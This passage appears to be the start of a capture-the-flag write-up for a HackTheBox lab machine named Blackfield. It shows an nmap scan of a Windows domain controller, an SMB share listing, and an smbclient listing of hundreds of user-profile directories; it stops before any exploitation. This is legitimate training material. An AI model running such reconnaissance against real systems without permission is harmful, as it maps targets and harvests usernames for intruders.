<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># nmap -O -A -T4 blackfiled.htb                                                                                                                                                                                             </span>
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span> <span class="mi">08</span><span class="p">:</span><span class="mi">45</span> <span class="no">EDT</span>                                                                                                                                                                            
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">blackfiled</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.192</span><span class="p">)</span>                                                                                                                                                                                         
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>                                                                                                                                                                                                                
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">993</span> <span class="n">filtered</span> <span class="n">ports</span>                                                                                                                                                                                                              
<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span>       <span class="no">VERSION</span>                                                                                                                                                                                                       
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">domain?</span>                                                                                                                                                                                                                     
<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="ss">strings:                                                                                                                                                                                                                     
</span><span class="o">|</span>   <span class="no">DNSVersionBindReqTCP</span><span class="p">:</span>                                                                                                                                                                                                                  
<span class="o">|</span>     <span class="n">version</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">bind</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="ss">time: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span> <span class="mi">19</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mo">04</span><span class="no">Z</span><span class="p">)</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local0</span><span class="p">.</span><span class="nf">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span>
<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mf">1.0</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local0</span><span class="p">.</span><span class="nf">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="o">.</span> <span class="no">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="nf">cgi?</span><span class="n">new</span><span class="o">-</span><span class="n">service</span> <span class="p">:</span>
<span class="no">SF</span><span class="o">-</span><span class="no">Port53</span><span class="o">-</span><span class="no">TCP</span><span class="ss">:V</span><span class="o">=</span><span class="mf">7.80</span><span class="o">%</span><span class="no">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="no">D</span><span class="o">=</span><span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">%</span><span class="no">Time</span><span class="o">=</span><span class="mi">5</span><span class="no">F09B484</span><span class="o">%</span><span class="no">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="no">DNSV</span>
<span class="no">SF</span><span class="ss">:ersionBindReqTCP</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="s2">"</span><span class="se">\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07</span><span class="s2">version\
SF:x04bind</span><span class="se">\0\0\x10\0\x03</span><span class="s2">"</span><span class="p">);</span>
<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="n">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="no">OS</span> <span class="n">fingerprint</span> <span class="n">not</span> <span class="n">ideal</span> <span class="ss">because: </span><span class="no">Missing</span> <span class="n">a</span> <span class="n">closed</span> <span class="no">TCP</span> <span class="n">port</span> <span class="n">so</span> <span class="n">results</span> <span class="n">incomplete</span>
<span class="no">No</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span>
<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">Host</span><span class="p">:</span> <span class="no">DC01</span><span class="p">;</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Windows</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows</span>

<span class="no">Host</span> <span class="n">script</span> <span class="ss">results:
</span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="ss">skew: </span><span class="mi">7</span><span class="n">h03m11s</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="ss">mode: 
</span><span class="o">|</span>   <span class="mf">2.02</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="no">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">and</span> <span class="n">required</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="ss">time: 
</span><span class="o">|</span>   <span class="ss">date: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span><span class="no">T19</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">44</span>
<span class="o">|</span><span class="n">_</span>  <span class="ss">start_date: </span><span class="no">N</span><span class="o">/</span><span class="no">A</span>

<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
<span class="mi">1</span>   <span class="mf">185.74</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
<span class="mi">2</span>   <span class="mf">186.22</span> <span class="n">ms</span> <span class="n">blackfiled</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.192</span><span class="p">)</span>

<span class="no">OS</span> <span class="n">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">224.21</span> <span class="n">seconds</span>
</code></pre></div></div>

<h2 id="smb-enumeration">SMB enumeration</h2>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">root</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 

        </span><span class="no">Sharename</span>       <span class="no">Type</span>      <span class="no">Comment</span>
        <span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
        <span class="no">ADMIN</span><span class="err">$</span>          <span class="no">Disk</span>      <span class="no">Remote</span> <span class="no">Admin</span>
        <span class="no">C</span><span class="err">$</span>              <span class="no">Disk</span>      <span class="no">Default</span> <span class="n">share</span>
        <span class="n">forensic</span>        <span class="no">Disk</span>      <span class="no">Forensic</span> <span class="o">/</span> <span class="no">Audit</span> <span class="n">share</span><span class="o">.</span>
        <span class="no">IPC</span><span class="err">$</span>            <span class="no">IPC</span>       <span class="no">Remote</span> <span class="no">IPC</span>
        <span class="no">NETLOGON</span>        <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
        <span class="n">profiles</span><span class="err">$</span>       <span class="no">Disk</span>      
        <span class="no">SYSVOL</span>          <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
<span class="no">SMB1</span> <span class="n">disabled</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>

</code></pre></div></div>

<h2 id="having-a-look-in-profiles">Having a look in <code class="language-plaintext highlighter-rouge">profiles$</code></h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Ac3:~# smbclient //10.10.10.192/profiles<span class="err">$</span>
Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANavay                              D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  APustulka                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ARotella                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASischo                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATakach                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
